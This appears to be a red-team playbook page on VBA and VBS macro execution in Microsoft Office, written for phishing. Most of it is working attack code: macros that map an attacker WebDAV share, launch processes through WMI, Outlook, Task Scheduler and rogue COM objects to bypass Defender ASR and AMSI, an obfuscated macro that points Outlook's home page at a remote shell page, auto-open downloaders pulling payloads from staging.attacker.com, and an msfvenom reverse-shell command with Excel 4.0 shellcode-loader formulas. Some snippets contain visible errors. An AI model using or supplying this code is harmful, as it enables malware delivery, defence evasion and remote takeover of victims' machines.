<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# VBA/VBS Execution ([`Office` TTP](TTP/T1137_Office_Application_Startup/T1137.md), [`Command and Scripting Interpreter - Visual Basic` TTP](TTP/T1059_Command_and_Scripting_Interpreter/005_Visual_Basic/T1059.005.md))
### Example Attacks

* <details><summary>Example 1 (Click to expand)</summary><p>
	1. Generate your payload
	1. Host your payload remotely
	1. Copy the URL where the payload is stored
	1. Include the text for the file to be included in execution.

			[Connection Manager]
			CMSFile=settings.txt
			ServiceName=WindowsUpdate
			TunnelFile=settings.txt
			[Settings]
			UpdateUrl=<INSERT_PAYLOAD_URL>
	1. Define the target filepath and write 
		* TIP: For the filepath with the user's name, define a variable with the user's username collected from the user environment

				user = Environ("Username")
		* Set fs = CreateObject("Scripting.FileSystemObject")

				Scripting.FileSystemObject.CreateTextFile.WriteLine("C:Users\", user, "\AppData\Roaming\Microsoft\Proof\settings.txt")

### Code Guide

1. Optional: Develop Reverse Shell Execution Method ([Reverse Shells Guide](Testaments_and_Books/Redvelations/Windows/004-1_Windows_Reverse_Shells.md))
	* Necessary for phishing
1. Write code and support the premise
	* <details><summary>Common premise-specific functions (Click to expand)</summary><p>
		* VBA Code
			* Execute on open
				* Define the script within **ThisWorkbook** as `Sub Workbook_Open()`
			* Word
				* Hide/Unhide Content

						.
			* Excel
				* Hide/Unhide Worksheet
					* Set the Visible property to FALSE:

							Worksheets("Sheet1").visible = False
					* Or set the Visible property to xlSheetHidden:

							Worksheets("Sheet1").visible = xlSheetHidden
1. <details><summary>Implement code that improves functionality (Click to expand)</summary><p>
	* Sleep Functions
		* Sometimes code is executing in a race condition between user activity and the system processing
		* Note this will require function-specific obfuscation (i.e., rewriting the function, as described in the obfuscation guide, to avoid detection)
1. Continue to VBA Obfuscation ([VBA Obfuscation Guide](Testaments_and_Books/Redvelations/Windows/003-1_VBA-VBS_Obfuscation.md))
* <details><summary>Map a webdav folder to a drive letter (Click to expand)</summary><p>
	1. Right-click on "Class Modules" and click "Insert" --> "Class Module".  Name it "DriveMapper" before pasting in this code:

			Option Explicit

			Private oMappedDrive As Scripting.Drive
			Private oFSO As New Scripting.FileSystemObject
			Private oNetwork As New WshNetwork

			Private Sub Class_Terminate()
			  UnmapDrive
			End Sub

			Public Function MapDrive(NetworkPath As String) As Scripting.Folder
			  Dim DriveLetter As String, i As Integer

			  UnmapDrive

			  For i = Asc("Z") To Asc("A") Step -1
			    DriveLetter = Chr(i)
			    If Not oFSO.DriveExists(DriveLetter) Then
			      oNetwork.MapNetworkDrive DriveLetter & ":", NetworkPath
			      Set oMappedDrive = oFSO.GetDrive(DriveLetter)
			      Set MapDrive = oMappedDrive.RootFolder
			      Exit For
			    End If
			  Next i
			End Function

			Private Sub UnmapDrive()
			  If Not oMappedDrive Is Nothing Then
			    If oMappedDrive.IsReady Then
			      oNetwork.RemoveNetworkDrive oMappedDrive.DriveLetter & ":"
			    End If
			    Set oMappedDrive = Nothing
			  End If
			End Sub
	1. Use the class like this:

			Sub GetBlogPost()
			  Dim f As File
			  Dim dm As New DriveMapper
			  Dim sharepointFolder As Scripting.Folder

			  Set sharepointFolder = dm.MapDrive("\\staging.attacker.com\webdav\folder")

			  Debug.Print sharepointFolder.Path
			  Debug.Print sharepointFolder.Path & "blogpost.xls"
			  
			  'Application.Wait (Now + TimeValue("0:00:5"))
			  ' do evil stuff like: Shell "z:\test.bat"
			  For Each f In sharepointFolder.Files
			    Debug.Print f.Name
			  Next f
			End Sub

* Execute binaries
	* References
		* [https://blog.sevagas.com/IMG/pdf/bypass_windows_defender_attack_surface_reduction.pdf](https://blog.sevagas.com/IMG/pdf/bypass_windows_defender_attack_surface_reduction.pdf)

 * <details><summary>Exec process using WMI (Click to expand)</summary><p>

	```
	' Exec process using WMI
	Function WmiExec(targetPath as String) As Integer
	    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
	    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
	    Set objConfig = objStartup.SpawnInstance_
	    set objProcess = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
	    WmiExec = objProcess.Create(targetPath, Null, objConfig, intProcessID)
	end Function
	```
* Outlook COM Object
	* References
		* [https://blog.sevagas.com/IMG/pdf/bypass_windows_defender_attack_surface_reduction.pdf](https://blog.sevagas.com/IMG/pdf/bypass_windows_defender_attack_surface_reduction.pdf)
	* Overview
		* Parent process is outlook.exe
	* Code

		```
		' Start app via outlook
		Sub OutlookApplication(targetPath As String)
		    Set outlookApp = CreateObject("Outlook.Application")
		    outlookApp.CreateObject("Wscript.Shell").Run targetPath, 0
		End Sub
		```
* Task Scheduler
	* References
		* [https://blog.sevagas.com/IMG/pdf/bypass_windows_defender_attack_surface_reduction.pdf](https://blog.sevagas.com/IMG/pdf/bypass_windows_defender_attack_surface_reduction.pdf)
	* Overview
		* ASR bypass
	* Code

		```
		' Execute a command via Sheduler
		Sub SchedulerExec(targetPath as String)
		    Set service = CreateObject("Schedule.Service")
		    ' Add an action to the task
		    Dim Action
		    Set Action = taskDefinition.Actions.Create(ActionTypeExec)
		    Action.arguments = GetArguments(targetPath)
		    Action.HideAppWindow = True
		    ' Register (create) the task
		    Call rootFolder.RegisterTaskDefinition("System Timer T", taskDefinitions, 6, , , 3)
		    ' Wait one sec
		    Application.Wait Now + TimeValue("0:00:01")
		    ' Delete task
		    Call rootFolder.DeleteTask("System Timer T", 0)
		End Sub
		```
* ShellWindows (CLSID: 9BA05972-F6A8-11CF-A442-00A0C90A8F39)
	* References
		* [https://blog.sevagas.com/IMG/pdf/bypass_windows_defender_attack_surface_reduction.pdf](https://blog.sevagas.com/IMG/pdf/bypass_windows_defender_attack_surface_reduction.pdf)
	* Overview
		* NoProgID so must be called with CLSID
		* Parent process is explorer.exe
		* ASR Bypass
	* Code

		```
		Sub ShellWindowsExec(targetPath As String)
		    Dim targetArguments As Variant
		    Dim targetFile As String
		    ' Separate file and arguments from cmdline
		    targetFile = Split(targetPath, " ") (0)
		    targetArguments = GetArguments(targetPath)
		    ' Get object
		    Set ShellWidnows = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
		    Set itemObj = ShellWindows.Item()
		    itemObj.Document.Application.ShellExecute targetFile, targetArguments, "", "open", 1
		End Sub
		```
* ShellBrowserWindow (CLSID: C08AFD90-F2A1-11D1-8455-AA0AC91F3880)
	* References
		* [https://blog.sevagas.com/IMG/pdf/bypass_windows_defender_attack_surface_reduction.pdf](https://blog.sevagas.com/IMG/pdf/bypass_windows_defender_attack_surface_reduction.pdf)
	* Code

		```
		Sub ShellWindowsExec(targetPath As String)
		    Dim targetArguments As Variant
		    Dim targetFile As String
		    ' Separate file and arguments from cmdline
		    targetFile = Split(targetPath, " ") (0)
		    targetArguments = GetArguments(targetPath)
		    ' Get object
		    Set shellBrowserWindow = GetObject("new:C08AFD90-F2A1-11D1-8455-AA0AC91F3880")
		    Set itemObj = ShellWindows.Item()
		    shellBrowserWindow.Document.Application.ShellExecute targetFile, targetArguments, "", "open", 1
		End Sub
		```
* Custom COM Object
	* References
		* [https://blog.sevagas.com/IMG/pdf/bypass_windows_defender_attack_surface_reduction.pdf](https://blog.sevagas.com/IMG/pdf/bypass_windows_defender_attack_surface_reduction.pdf)
	* Overview
		* Since we have access to the registry, we can simply just create a new rogue COM object with LocalServer32 set and call it. ASR Bypass.
	* Code

			' Exec process by creating custom COM object
			Sub ComObjectExec(targetPath)
			    Dim wsh As Object
			    Dim regKey, clsid As String
			    Set wsh = CreateObject("WScript.Shell")
			    ' Register a false com object
			    clsid = "{C7B167EA-DB3E-4659-BBDC-D1CCC00EFE9C}"
			    regKeyClass = "HKEY_CURRENT_USER\Software\Classes\CLSID\" & clsid & "\"
			    regKeyLocalServer = "HKEY_CURRENT_USER\Software\Classes\CLSID" & clsid & "\LocalServer32\"
			    ' Create keys
			    wsh.RegWrite regKeyClass, "whatever", "REG_SZ"
			    wsh.RegWrite regKeyLocalServer, targetPath, "REG_EXPAND_SZ"
			    ' Start registered COM object CLSID
			    GetObject ("new:" & clsid)
			    ' Remove keys
			    wsh.RegDelete regKeyLocalServer
			    wsh.RegDelete regKeyClass
			End Sub
* Move DLL and change directory
	* References
		* [https://blog.sevagas.com/IMG/pdf/bypass_windows_defender_attack_surface_reduction.pdf](https://blog.sevagas.com/IMG/pdf/bypass_windows_defender_attack_surface_reduction.pdf)
	* Overview
		* NOTE: The loaded DLL does not have necessarily to have “.dll” extension. This is interesting to know if you need to drop/load malicious DLLs from and Office macro.
	* Code

			Private Declare PtrSafe Sub Sleep Lib "k32.dell" (ByVal dwMilliseconds As Long)
			' Wait two seconds and execute
			    ' copy kernel32 dll to TEMP
			    WScriptExec ("cmd.exe" /C copy /b C:\windows\system32\kernel32.dell " & Environ("TEMP") & "\k32.dll")
			    ' move to TEMP
			    CreateObject("WScript.Shell").currentdirectory = Environ("TEMP")
			    ' Call Sleep, will load Sleep function in copied kernel32
			    Sleep 2000
			    WscriptExec "notepad.exe"
			End Sub

			' Exec process using WScript.Shell
			Sub WscriptExec(targetPath As String)
			    CreateObject("WScript.Shell").Run targetPath, 1
			End Sub
* Simple AMSI Bypass

		Sub WscriptExec(targetPath)
		    Set comApp = CreateObject("RDS.DataSpace")
		    comApp.CreateObject("Wscript.Shell", "").Run targetPath, 0
		End Sub
* Macro to unset registry key "patch" for CVE-2017-11774
	* References
		* [https://www.fireeye.com/blog/threat-research/2019/12/breaking-the-rules-tough-outlook-for-home-page-attacks.html](https://www.fireeye.com/blog/threat-research/2019/12/breaking-the-rules-tough-outlook-for-home-page-attacks.html)
	* Overview
		* "a creative implementation of CVE-2017-11774 using the lesser-known HKCU\Software\Microsoft\Office\<Outlook Version>\Outlook\WebView\Calendar\URL registry key"
	* Code

		```
		Function RegKeyRead(i_RegKey)
		    Dim myWS
		    On Error Resume Next
		    Set myWS = CreateObject("WSCri" & "pt.Sh" & "ell")
		    RegKeyRead = myWS.RegRead(i_RegKey)
		End Function

		Function RegKeySave(i_RegKey, i_Value, i_Type)
		    Dim myWS
		    Set myWS = CreateObject("WScri" & "pt.Sh" & "ell")
		    myWS.RegWrite i_RegKey, i_Value, i_Type
		End Function

		Public Function setHomepage()
		    Url = "ht|tps:|//sta|ging.att|acker.co|m/shell.html"

		    ' loop through all Outlook versions
		    Dim oVersion
		    oVersion = Array(16, 15, 14, 12, 11, 10)
		    For Each x In oVersion
		        Dim key
		        Dim before
		        Dim after
		        Dim exists
		        Dim domain
		        domain = Replace(Url, "|", "")
		        before = Replace("HKEY_CUR|RENT_USER\Software\Microsoft\Office\", "|", "")
		        after = Replace(".0\Outlook\Outlook|Name", "|", "")
		        key = before & x & after
		        exists = RegKeyRead(key)
		        If InStr(1, exists, "Outlook", vbTextCompare) > 0 Then
		            after1 = Replace(".0\Outlook\WebView\Cale|ndar\URL", "|", "")
		            after2 = Replace(".0\Outlook\Security\Enable|RoamingFolderHomepages", "|", "")
		            key1 = before & x & after1
		            key2 = before & x & after2
		            RegKeySave CStr(key1), domain, "REG_SZ"
		            RegKeySave CStr(key2), 1, "REG_DWORD"
		        End If
		    Next
		End Function

		Sub Macro2()
		    setHomepage
		End Sub
		```

* File Download
	* Overview
		* Always consider pointing to webdav share instead of downloading
	* XMLHTTP (Bypass ASR & AMSI by using fake name)
		* References
			* [https://blog.avira.com/new-malware-in-old-excel-skins/](https://blog.avira.com/new-malware-in-old-excel-skins/)
		* Code

			```
			Sub Download(muURL As String, realPath As String)
			    Dim downloadPath As String
			    downloadPath = Environ("TEMP") & "\\" & "acqeolw.txt"
			    Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
			    WinHttpReq.Send
			    If WinHttpReq.Status = 200 Then
			        Set oStream = CreateObject("ADODB.Stream")
			        oStream.SaveToFile downloadPath, 2
			        oStream.Close
			        renameCmd = "C:\windows\system32\cmd.exe /C move " & downloadPath & " " & realPath
			        RDS_DataSpaceExec renameCmd
			        Application.Wait Now + TimeValue("0:00:01")
			    End If
			End Sub
			```
	* XMLHTTP
		* Code
			```
			Sub DownloadFile()

			    Dim myURL As String
			    myURL = "https://staging.attacker.com/msbuild.xml"
			    
			    Dim WinHttpReq As Object
			    Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
			    WinHttpReq.Open "GET", myURL, False
			    WinHttpReq.send
			    
			    myURL = WinHttpReq.responseBody
			    If WinHttpReq.Status = 200 Then
			        Set oStream = CreateObject("ADODB.Stream")
			        oStream.Open
			        oStream.Type = 1
			        oStream.Write WinHttpReq.responseBody
			        oStream.SaveToFile "C:\users\public\downloads\msbuild.xml", 2
			        oStream.Close
			    End If

			End Sub
			```
	* Internet Explorer
		* Code

			```
			Sub Auto_Open()
			    Dim strBaseURL As String 'URL to Visit
			    strBaseURL = "https://staging.attacker.com/msbuild.xml" 'Change Me
			    Set IE = CreateObject("InternetExplorer.Application") 'Opening Object
			    IE.Visible = False 'Don't let the user see it
			    IE.navigate strBaseURL 'Navigate to the website
			    On Error GoTo ErrorHandler
			    Do While IE.Busy: DoEvents: Loop
			    Do While IE.ReadyState <> 4: DoEvents: Loop
			    Set doc = IE.Document
			    'Set lnkOverRide = doc.getElementById("overridelink")
			    'If Not lnkOverRide Is Nothing Then
			        'lnkOverRide.Click
			        Do While IE.Busy: DoEvents: Loop
			        Do While IE.ReadyState <> 4: DoEvents: Loop
			        Set doc = IE.Document
			    'End If
			    Dim testString As String
			    testString = IE.Document.body.innerText
			    IE.Stop
			    IE.Quit
			    Dim fso As Object 'Write Output to File
			    Set fso = CreateObject("Scripting.FileSystemObject")
			    Dim oFile As Object
			    Dim randName As String
			    randName = StrReverse("\PMET\swodniW\:C") & Int((20 - 1 + 1) * Rnd + 1) & ".txt"
			    Set oFile = fso.CreateTextFile(randName)
			    oFile.Write (testString)
			    oFile.Close
			ErrorHandler:
			    Exit Sub
			End Sub
			```
* VBA Custom/Builtin Properties (Comments, etc)
	* Access document properties (MSWord)
		* author

			```
			Debug.Print ActiveDocument.BuiltInDocumentProperties("Author")
			```
		* custom property #1

			```
			Debug.Print ActiveDocument.CustomDocumentProperties(1)
			```
	* Set custom property (MSWord)
		* set by order

			```
			ActiveDocument.CustomDocumentProperties(1).Value = "13.37"
			```
		* set by key name

			```
			ActiveDocument.CustomDocumentProperties("AppVersion").Value = "13.37"
			```


### NEEDS Research
* Excel 4.0 Macros
	* References
		* [https://blog.avira.com/new-malware-in-old-excel-skins/](https://blog.avira.com/new-malware-in-old-excel-skins/)
	* Storing shellcode in Excel Workbook comment
		* References
			* [https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/](https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/)
			* [https://medium.com/@fsx30/excel-4-0-macro-old-but-new-967071106be9](https://medium.com/@fsx30/excel-4-0-macro-old-but-new-967071106be9)
		* Overview
			* Unable to get this to work.  Shell connects back, but Excel crashes and the shell with it.
		* Process
			1. Generate shellcode, excluding null bytes
			```
			$ msfvenom -p windows/meterpreter/reverse_https -b '\x00' LHOST=1.2.3.4 LPORT=443 -f c
			```
			1. Open hex editor and "paste write" shellcode in comment
			1. Create new Excel document
				* Right-click sheet name and click "Insert" --> "MS Excel 4.0 Macro"
				* Rename the top-left cell from "A1" to "Auto_open"
				* Paste the following in, starting with cell A1:
					* US Version (A1, A2, B1, B2 etc.)

						```
						=REGISTER("Kernel32","VirtualAlloc","JJJJJ","Alloc",,1,9)
						=REGISTER("Kernel32","WriteProcessMemory","JJJCJJJ","WPM",,1,9)
						=REGISTER("Kernel32","CreateThread","JJJJJJJ","CThread",,1,9)
						=Alloc(0,4096,4096,64)
						=SET.VALUE(B5,WPM(-1,A4,LEFT(GET.WORKBOOK(37),255),255,0))
						=SET.VALUE(B6,WPM(-1,A4+255,MID(GET.WORKBOOK(37),256,255),255,0))
						=SET.VALUE(B7,WPM(-1,A4+(255*2),MID(GET.WORKBOOK(37),511,255),255,0))
						=SET.VALUE(B8,WPM(-1,A4+(255*3),MID(GET.WORKBOOK(37),766,255),255,0))
						=SET.VALUE(B1,DEC2HEX(A4))
						=SET.VALUE(B2,A4)
						=CThread(0,0,B2,0,0,0)
						=HALT()
						```
					* International Version (Rows & Columns)

						```
						=REGISTER("Kernel32","VirtualAlloc","JJJJJ","Alloc",,1,9)
						=REGISTER("Kernel32","WriteProcessMemory","JJJCJJJ","WPM",,1,9)
						=REGISTER("Kernel32","CreateThread","JJJJJJJ","CThread",,1,9)
						=Alloc(0,4096,4096,64)
						=SET.VALUE(RC[1],WPM(-1,R[-1]C,LEFT(GET.WORKBOOK(37),255),255,0))
						=SET.VALUE(RC[1],WPM(-1,R[-2]C+255,MID(GET.WORKBOOK(37),256,255),255,0))
						=SET.VALUE(RC[1],WPM(-1,R[-3]C+(255*2),MID(GET.WORKBOOK(37),511,255),255,0))
						=SET.VALUE(RC[1],WPM(-1,R[-4]C+(255*3),MID(GET.WORKBOOK(37),766,255),255,0))
						=SET.VALUE(R[-8]C[1],DEC2HEX(R[-5]C))
						=SET.VALUE(R[-8]C[1],R[-6]C)
						=CThread(0,0,R[-9]C[1],0,0,0)
						=HALT()
						```
			1. Fill workbook comment with text so you can recognize it in the hex editor
				* File --> Info --> "Show All Properties" --> Comments
				* Length == 1024 (in this example) (e.g. `AAAAAAAAAAAAAAAAAAAA....`)
				* save the file
			1. In hex editor (such as HxD), open file and "paste write" starting at the beginning of the comment


([`Office - Office Test` TTP](TTP/T1137_Office_Application_Startup/002_Office_Test/T1137.002.md))